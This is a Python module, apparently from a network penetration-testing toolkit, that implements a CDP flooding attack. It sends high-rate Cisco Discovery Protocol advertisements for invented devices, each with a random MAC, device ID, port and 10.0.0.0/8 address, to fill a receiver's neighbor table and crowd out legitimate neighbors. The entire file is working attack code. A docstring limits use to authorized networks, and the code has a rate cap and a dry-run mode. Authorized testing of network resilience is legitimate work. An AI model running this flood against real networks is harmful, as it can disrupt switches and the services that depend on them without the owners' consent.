"""CDP flooding: send a high rate of CDP advertisements for invented devices.

A receiver that keeps CDP neighbors stores one entry for each device that advertises
itself. A flood of advertisements from invented devices, each with its own identity,
port and address, fills that table and keeps the receiver busy parsing them. Legitimate
neighbors can be evicted or delayed while the flood lasts.

Every frame here comes from a random unicast source MAC and advertises a random device
ID, port and management address, so each one can create a new neighbor entry. The
effect to measure is the neighbor table and the rate it can keep up with.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import ipaddress
import random
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import sendp

from macabre.attacks.cdp_spoofing import build_frame
from macabre.attacks.common import random_mac

MAX_RATE = 5000.0          # frames per second; higher rates are refused
BATCH_SECONDS = 0.1        # frames are sent in batches this long


@dataclass(frozen=True)
class CdpFloodingConfig:
    iface: str                  # attacker interface, on the segment with the receiver
    rate: float = 100.0         # advertisements per second
    count: int = 0              # advertisements to send in total; 0 = run until stopped
    dry_run: bool = False       # build advertisements but do not send them

    def __post_init__(self) -> None:
        if not 0 < self.rate <= MAX_RATE:
            raise ValueError(f"Rate must be between 0 and {MAX_RATE:g} advertisements per second.")
        if self.count < 0:
            raise ValueError("Count cannot be negative.")


@dataclass
class CdpFloodingStats:
    frames: int = 0
    status: str = ""


def flood_frames(rng: random.Random, how_many: int) -> list:
    """Advertisements from random source MACs, each for a random device, port and address."""
    frames = []
    for _ in range(how_many):
        address = str(ipaddress.IPv4Address(0x0A000000 | rng.getrandbits(24)))  # 10.0.0.0/8
        frames.append(build_frame(
            random_mac(rng),
            device_id=f"SW-{rng.getrandbits(32):08x}",
            port_id=f"Gi0/{rng.randrange(1, 49)}",
            address=address,
        ))
    return frames


def run_cdp_flooding(
    config: CdpFloodingConfig,
    stop_event: threading.Event,
    on_progress: Callable[[CdpFloodingStats], None],
    rng: random.Random | None = None,
    send: Callable[..., Any] | None = None,
) -> CdpFloodingStats:
    """Send advertisements at `rate` per second until `count` or `stop_event`."""
    rng = rng or random.Random()
    send = send or sendp

    if config.dry_run:
        stats = CdpFloodingStats(
            status=(
                f"Dry run: would send about {config.rate:g} CDP advertisements per second for random "
                f"devices. Nothing sent."
            ),
        )
        on_progress(replace(stats))
        return stats

    per_batch = max(1, round(config.rate * BATCH_SECONDS))
    stats = CdpFloodingStats()
    while not stop_event.is_set() and (config.count == 0 or stats.frames < config.count):
        batch = per_batch
        if config.count:
            batch = min(batch, config.count - stats.frames)
        send(flood_frames(rng, batch), iface=config.iface, verbose=False)
        stats.frames += batch
        on_progress(replace(stats))
        stop_event.wait(BATCH_SECONDS)
    return stats
